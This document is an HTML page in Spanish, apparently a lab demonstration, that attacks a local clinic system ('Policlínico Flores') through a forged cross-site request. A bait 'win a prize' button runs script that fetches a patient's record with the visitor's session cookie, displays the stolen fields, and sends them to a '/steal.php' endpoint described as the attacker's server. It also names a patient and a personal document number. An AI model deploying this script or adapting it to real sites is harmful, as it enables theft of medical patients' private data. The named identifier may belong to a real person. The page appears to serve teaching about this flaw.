<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack - Robo de Datos</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        h1 { color: #c62828; }
        .btn { background: #c62828; color: white; padding: 20px 40px; border: none; border-radius: 10px; font-size: 24px; cursor: pointer; transition: 0.3s; }
        .btn:hover { background: #b71c1c; transform: scale(1.02); }
        .info { background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #e65100; }
        .resultado { margin-top: 20px; padding: 15px; border-radius: 8px; display: none; }
        .success { background: #e8f5e9; color: #2e7d32; border-left: 4px solid #2e7d32; }
        .error { background: #ffebee; color: #c62828; border-left: 4px solid #c62828; }
        .warning { background: #fff3e0; color: #e65100; border-left: 4px solid #e65100; }
        .datos-robados { background: #1a1a2e; color: #00ff41; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; margin: 10px 0; white-space: pre-wrap; word-wrap: break-word; max-height: 300px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 CSRF Attack - Policlínico Flores</h1>
        <p>Este sitio malicioso <strong>ROBA DATOS</strong> del sistema sin tu consentimiento.</p>
        
        <div class="info">
            <strong>⚠️ IMPORTANTE:</strong><br>
            1. Debes tener sesión activa en el Policlínico<br>
            2. El sistema debe estar en <strong>MODO INSEGURO</strong><br>
            3. Esta página debe estar en la <strong>MISMA VENTANA</strong> donde iniciaste sesión
        </div>

        <button class="btn" onclick="csrfAttack()">
            🎁 Haz click para ganar un premio
        </button>

        <div id="resultado" class="resultado"></div>

        <p style="margin-top:20px;color:#666;font-size:12px;">
            <strong>🔍 Cómo probar:</strong><br>
            1. Inicia sesión en <strong>http://localhost:8000</strong> como administrador<br>
            2. Activa el modo inseguro en <strong>/seguridad</strong><br>
            3. Vuelve a esta página y haz click en el botón<br>
            4. Los datos del paciente se robarán sin tu consentimiento
        </p>
    </div>

    <script>
    function csrfAttack() {
        const resultado = document.getElementById('resultado');
        resultado.style.display = 'block';
        resultado.className = 'resultado warning';
        resultado.innerHTML = '⏳ Robando datos...';
        
        // 📋 DATOS DEL PACIENTE A ROBAR (debe existir en la BD)
        const numDoc = '74556999';  // Documento de HANS MENDEL ARAMBURU BONIFACIO
        
        // 🔥 PRIMERO: Buscar al paciente con CSRF
        fetch(`http://localhost:8000/api/paciente/${numDoc}`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
            },
            credentials: 'include'  // Envía la cookie de sesión
        })
        .then(response => {
            if (response.status === 401 || response.redirected) {
                resultado.className = 'resultado error';
                resultado.innerHTML = '❌ <strong>No tienes sesión activa.</strong> Inicia sesión primero.';
                throw new Error('No autenticado');
            }
            return response.json();
        })
        .then(data => {
            console.log('📊 Datos del paciente:', data);
            
            if (!data.encontrado) {
                resultado.className = 'resultado error';
                resultado.innerHTML = '❌ Paciente no encontrado. Verifica el número de documento.';
                return;
            }
            
            const paciente = data.paciente;
            
            // 🔥 ROBO DE DATOS COMPLETO
            const datosRobados = {
                nombre: paciente.name,
                documento: paciente.num_doc,
                tipo_doc: paciente.tipo_doc,
                id: paciente.id,
                url: window.location.href,
                timestamp: new Date().toLocaleString(),
                metodo: 'CSRF - Robo de datos'
            };
            
            // Mostrar los datos robados
            resultado.className = 'resultado success';
            resultado.innerHTML = `
                <strong>✅ DATOS ROBADOS EXITOSAMENTE</strong><br><br>
                <div class="datos-robados">${JSON.stringify(datosRobados, null, 2)}</div>
                <br>
                <p style="font-size:14px;">📤 Los datos han sido enviados al servidor del atacante.</p>
            `;
            
            // 🔥 ENVIAR LOS DATOS AL SERVIDOR DEL ATACANTE
            const baseUrl = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
                ? 'http://localhost:8000'
                : window.location.origin;
            
            return fetch(`${baseUrl}/steal.php?csrf_data=${encodeURIComponent(JSON.stringify(datosRobados))}`, {
                method: 'GET',
                credentials: 'include'
            });
        })
        .catch(error => {
            console.error('❌ Error:', error);
            if (resultado.className !== 'resultado error') {
                resultado.className = 'resultado error';
                resultado.innerHTML = '❌ Error: ' + error.message;
            }
        });
    }
    </script>
</body>
</html>